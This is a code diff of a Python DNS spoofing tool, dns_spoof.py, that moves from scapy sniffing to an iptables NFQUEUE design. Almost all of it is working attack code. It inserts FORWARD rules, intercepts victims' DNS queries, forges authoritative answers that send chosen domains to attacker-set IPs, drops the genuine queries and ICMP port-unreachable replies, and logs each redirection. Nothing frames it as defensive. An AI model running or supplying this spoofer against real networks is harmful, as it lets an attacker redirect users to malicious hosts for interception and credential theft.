@@ -1,86 +1,129 @@
-from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf
+# dns_spoof.py
+
 import os
+import logging
+from netfilterqueue import NetfilterQueue
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, ICMP, send, conf
 
+def init_logging(log_dir="logs", log_file="dns_spoof.log"):
+    """
+    Initialize file‐based logging for DNS spoof events.
+    """
+    if not os.path.isdir(log_dir):
+        os.makedirs(log_dir)
+    full_path = os.path.join(log_dir, log_file)
+    logging.basicConfig(
+        filename=full_path,
+        level=logging.INFO,
+        format="%(asctime)s %(levelname)s: %(message)s"
+    )
+    logging.info("=== DNS Spoofer Log Started ===")
 
-def spoof_dns_packet(pkt, domain_ip_map, iface):
-    # Check if the packet is a DNS query (not a response) and uses UDP
-    if pkt.haslayer(DNSQR) and pkt.haslayer(UDP) and pkt[DNS].qr == 0:
-        try:
-            # Extract the queried domain from the DNS packet
-            queried_domain = pkt[DNSQR].qname.decode().strip(".").lower()
+def setup_nfqueue(queue_num=1):
+    """
+    Install iptables rules so DNS and ICMP port-unreachable packets hit NFQUEUE.
+    """
+    print("[*] Installing NFQUEUE rules (queue #{})...".format(queue_num))
+    os.system("iptables -I FORWARD -p udp --dport 53   -j NFQUEUE --queue-num {}".format(queue_num))
+    os.system("iptables -I FORWARD -p udp --sport 53   -j NFQUEUE --queue-num {}".format(queue_num))
+    os.system("iptables -I FORWARD -p icmp --icmp-type port-unreachable -j NFQUEUE --queue-num {}".format(queue_num))
 
-            # Ignore domains that are not in our spoofing list
-            if queried_domain not in domain_ip_map:
-                print("[-] Ignored domain: {}".format(queried_domain))
-                return
+def teardown_nfqueue(queue_num=1):
+    """
+    Remove the NFQUEUE iptables rules.
+    """
+    print("[*] Removing NFQUEUE rules (queue #{})...".format(queue_num))
+    os.system("iptables -D FORWARD -p udp --dport 53   -j NFQUEUE --queue-num {}".format(queue_num))
+    os.system("iptables -D FORWARD -p udp --sport 53   -j NFQUEUE --queue-num {}".format(queue_num))
+    os.system("iptables -D FORWARD -p icmp --icmp-type port-unreachable -j NFQUEUE --queue-num {}".format(queue_num))
 
-            # Look up the fake IP to respond with
-            fake_ip = domain_ip_map[queried_domain]
-            victim_ip = pkt[IP].src
-            victim_port = pkt[UDP].sport
-            dns_id = pkt[DNS].id
+def spoof_dns_packet(packet, domain_map, iface):
+    """
+    Craft and send a fake DNS response for the given query.
+    """
+    victim_ip = packet[IP].src
+    domain    = packet[DNSQR].qname.decode().strip('.').lower()
+    fake_ip   = domain_map[domain]
 
-            print("\n[>] Intercepted DNS query from {} for {}".format(victim_ip, queried_domain))
+    # Reverse the original query's IP/UDP headers
+    ip_layer  = IP(src=packet[IP].dst, dst=victim_ip)
+    udp_layer = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
 
-            # Build the spoofed response packet
-            ip_layer = IP(src=pkt[IP].dst, dst=victim_ip)
-            udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+    # Build the DNS answer section
+    answer = DNSRR(
+        rrname=packet[DNS].qd.qname,
+        type='A', rclass='IN', ttl=300,
+        rdata=fake_ip
+    )
+    dns_resp = DNS(
+        id=packet[DNS].id,
+        qr=1, aa=1,
+        rd=packet[DNS].rd, ra=1,
+        qd=packet[DNS].qd,
+        an=answer, ancount=1
+    )
 
-            # Create the DNS answer with the fake IP
-            dns_answer = DNSRR(
-                rrname=pkt[DNSQR].qname,    # The domain we are answering for
-                type="A",   # Resource Record type A (IPv4 address)
-                rclass="IN",    # Internet class
-                ttl=300,    # Time to live for the DNS record
-                rdata=fake_ip   # The fake IP address to return
-            )
+    response = ip_layer / udp_layer / dns_resp
+    # Force recalculation of checksums and lengths
+    del response[IP].len
+    del response[IP].chksum
+    del response[UDP].len
+    del response[UDP].chksum
 
-            dns_layer = DNS(
-                id=dns_id,  # Use the same ID as the request
-                qr=1,   # Set the response flag
-                aa=1,   # Authoritative answer
-                rd=pkt[DNS].rd, # Recursion Desired flag
-                ra=1,   # Recursion Available flag
-                qd=pkt[DNS].qd, # Copy the original query
-                an=dns_answer,  # Add the answer section with our fake IP
-                ancount=1   # Number of answers in the response
-            )
+    send(response, iface=iface, verbose=False)
+    msg = "SPOOFED: {} requested {} → redirected to {}".format(victim_ip, domain, fake_ip)
+    print("[+] {}".format(msg))
+    logging.info(msg)
 
-            # Combine all layers into the final spoofed response packet
-            spoofed_response = ip_layer / udp_layer / dns_layer
-
-            # Force Scapy to recalculate checksums and lengths
-            del spoofed_response[IP].len
-            del spoofed_response[IP].chksum
-            del spoofed_response[UDP].len
-            del spoofed_response[UDP].chksum
-
-            # Send the fake response to the victim
-            send(spoofed_response, iface=iface, verbose=0)
-            print("[+] Sent spoofed DNS response with {} to {}".format(fake_ip, victim_ip))
-
-        except Exception as e:
-            print("[!] Error processing DNS packet: {}".format(e))
-
-def start_dns_spoofer(domain_ip_map, iface):
-    print("[*] DNS spoofing started")
-    print("[*] Listening on interface: {}".format(iface))
-    print("[*] Spoofing targets:")
-    for domain, ip in domain_ip_map.items():
-        print("  - {} -> {}".format(domain, ip))
-
-
+def start_dns_spoofer(domain_map, iface, queue_num=1):
+    """
+    Begin intercepting packets. Spoof matching DNS queries;
+    drop ICMP port-unreachable; forward all other traffic.
+    """
     conf.iface = iface
+    queue = NetfilterQueue()
 
+    print("[*] Domains to spoof: {}".format(domain_map))
+    print("[*] DNS NFQUEUE running. Press Ctrl+C to stop.")
+    logging.info("Started DNS spoofer on interface %s, queue %d", iface, queue_num)
+
+    def handle_packet(nf_packet):
+        raw = nf_packet.get_payload()
+        pkt = IP(raw)
+
+        # 1) Drop ICMP port-unreachable
+        if pkt.haslayer(ICMP) and pkt[ICMP].type == 3 and pkt[ICMP].code == 3:
+            msg = "DROPPED ICMP port-unreachable to {}".format(pkt[IP].dst)
+            print("[*] {}".format(msg))
+            logging.info(msg)
+            nf_packet.drop()
+            return
+
+        # 2) Inspect DNS queries
+        if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
+            query = pkt[DNSQR].qname.decode().strip('.').lower()
+            src    = pkt[IP].src
+            print("[*] Intercepted DNS query '{}' from {}".format(query, src))
+
+            if query in domain_map:
+                print("    -> Spoofing {}".format(query))
+                spoof_dns_packet(pkt, domain_map, iface)
+                nf_packet.drop()
+            else:
+                print("    -> Forwarding {}".format(query))
+                logging.info("IGNORED: %s requested %s", src, query)
+                nf_packet.accept()
+            return
+
+        # 3) All other packets: let them pass
+        nf_packet.accept()
+
+    queue.bind(queue_num, handle_packet)
     try:
-        # Start sniffing DNS queries
-        sniff(
-            iface=iface,
-            filter="udp port 53",
-            prn=lambda pkt: spoof_dns_packet(pkt, domain_ip_map, iface),
-            store=False
-        )
+        queue.run()
     except KeyboardInterrupt:
-        print("\n[!] DNS spoofing stopped.")
-    except Exception as e:
-        print("[!] Error during sniffing: {}".format(e))
+        pass
+    finally:
+        queue.unbind()
+        print("[*] DNS spoofer stopped, NFQUEUE unbound.")
+        logging.info("Stopped DNS spoofer, NFQUEUE unbound.")
